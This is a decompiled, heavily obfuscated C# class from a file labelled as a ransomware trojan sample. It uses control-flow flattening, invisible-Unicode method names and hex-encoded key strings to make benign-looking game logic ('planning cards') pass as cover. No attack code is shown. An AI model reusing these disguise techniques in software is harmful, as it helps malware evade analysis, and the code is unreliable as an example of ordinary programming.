// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: EraIn, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: DF309F35-9A6B-48AA-8FAD-6A916AD051A5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-58c054c4226f2a650a02bbf4b2db908c7317491c91a4f3254cc0d835c474897d.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 187218801;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 669125112)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 79845186 ^ 2141054808;
            continue;
          case 2:
            num1 = (int) num2 * 85419655 ^ 1116627812;
            continue;
          case 4:
            str1 = "466F756E64446174655061747465";
            num1 = (int) num2 * -895673092 ^ 1997627165;
            continue;
          case 5:
            int num3 = !flag ? 1487332602 : (num3 = 1908437805);
            num1 = num3 ^ (int) num2 * -929782583;
            continue;
          case 6:
            str1 = "6B7837564A67656B";
            num1 = (int) num2 * -1168510088 ^ -406619344;
            continue;
          case 7:
            int num4;
            num1 = num4 = BaseStream != 1 ? 1537677458 : (num4 = 394183966);
            continue;
          case 8:
            num1 = (int) num2 * -1091984003 ^ 1441019562;
            continue;
          case 9:
            str1 = (string) null;
            num1 = (int) num2 * 1310548563 ^ 744375420;
            continue;
          case 10:
            str2 = str1;
            num1 = 706768899;
            continue;
          case 11:
            flag = BaseStream == 0;
            num1 = (int) num2 * 1808333090 ^ 2025770819;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1032773848;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -2106357091)) % 4U)
        {
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -1677185605 ^ -709325647;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 2:
            goto label_1;
          case 3:
            num4 = 0;
            break;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = -218616199;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = 925831775;
        int planningCardsCount;
        int[] planningCards;
        int index;
        int num3;
        bool flag;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 137739800)) % 12U)
          {
            case 0:
              ++index;
              num2 = 831936773;
              continue;
            case 2:
              planningCardsCount = num1;
              num2 = (int) num4 * -1334038819 ^ -1322571129;
              continue;
            case 3:
              flag = num3 > 0;
              num2 = (int) num4 * -1904320008 ^ 1981816496;
              continue;
            case 4:
              goto label_1;
            case 5:
              index = 0;
              num2 = (int) num4 * 1222973635 ^ -1208796418;
              continue;
            case 6:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * -1619908934 ^ 816796717;
              continue;
            case 7:
              ++num1;
              num2 = (int) num4 * -1311338747 ^ 1179076307;
              continue;
            case 8:
              int num5 = !flag ? 1921611560 : (num5 = 2047025639);
              num2 = num5 ^ (int) num4 * -15488571;
              continue;
            case 9:
              int num6;
              num2 = num6 = index < planningCards.Length ? 409322030 : (num6 = 1893784466);
              continue;
            case 10:
              num3 = planningCards[index];
              num2 = 2134117739;
              continue;
            case 11:
              num2 = (int) num4 * 1575441300 ^ 1506813714;
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 2007913290;
      bool flag;
      string str1;
      string str2;
      int index;
      int planningCard;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1611200662)) % 15U)
        {
          case 0:
            ++index;
            num1 = 7015013;
            continue;
          case 1:
            index = 0;
            num1 = (int) num2 * 1761682708 ^ -584866524;
            continue;
          case 2:
            num1 = (int) num2 * -1030582782 ^ 817525827;
            continue;
          case 3:
            num1 = (int) num2 * 88112847 ^ 1768996015;
            continue;
          case 4:
            flag = planningCard == 0;
            num1 = (int) num2 * 1143429605 ^ -1401759681;
            continue;
          case 5:
            int num3;
            num1 = num3 = index >= this.PlanningCards.Length ? 1334836179 : (num3 = 791607671);
            continue;
          case 6:
            goto label_1;
          case 7:
            num1 = (int) num2 * -2002317733 ^ 2114293015;
            continue;
          case 8:
            int num4 = !flag ? 710869281 : (num4 = 20185347);
            num1 = num4 ^ (int) num2 * 1514560175;
            continue;
          case 9:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 255254160 ^ 1447420075;
            continue;
          case 10:
            str1 = " ";
            num1 = (int) num2 * 1913280463 ^ 990936559;
            continue;
          case 11:
            str1 = Player.\u202A‌‪‭‎⁯⁭‪‬⁮‪‬⁭⁭‎⁫⁯‪⁬⁯⁬‮⁬⁪‌⁭⁭‬‬​‍‪‏‪‬‪⁯​‌‎‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 625823196;
            continue;
          case 13:
            num1 = 645563338;
            continue;
          case 14:
            str2 = str1;
            num1 = (int) num2 * 1915888212 ^ -961082661;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 929736577;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 975007904)) % 4U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 453830047 ^ 72589468;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 765874938 ^ 1347434402;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1946158794;
      int[] numArray;
      int[] planningCards;
      int aIndex;
      int count;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2040675320)) % 7U)
        {
          case 0:
            flag = aIndex < count;
            num1 = 318551960;
            continue;
          case 1:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -690787505 ^ 1400079928;
            continue;
          case 2:
            planningCards = numArray;
            num1 = (int) num2 * -368115715 ^ 1975482389;
            continue;
          case 4:
            goto label_1;
          case 5:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 329862742;
            continue;
          case 6:
            int num3 = !flag ? -733441992 : (num3 = -1488561958);
            num1 = num3 ^ (int) num2 * -1051745339;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -383998194;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -967108624)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            str = Player.\u206C⁬⁭⁬‬‬‭‬⁯⁫⁫​⁮‫⁫‪‫‎⁭‬⁮‪‬⁯‭‪⁪⁫‫‪⁬​‬‫⁭‏‪‮‭‭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 963033132 ^ 859961673;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u202A‌‪‭‎⁯⁭‪‬⁮‪‬⁭⁭‎⁫⁯‪⁬⁯⁬‮⁬⁪‌⁭⁭‬‬​‍‪‏‪‬‪⁯​‌‎‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206C⁬⁭⁬‬‬‭‬⁯⁫⁫​⁮‫⁫‪‫‎⁭‬⁮‪‬⁯‭‪⁪⁫‫‪⁬​‬‫⁭‏‪‮‭‭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
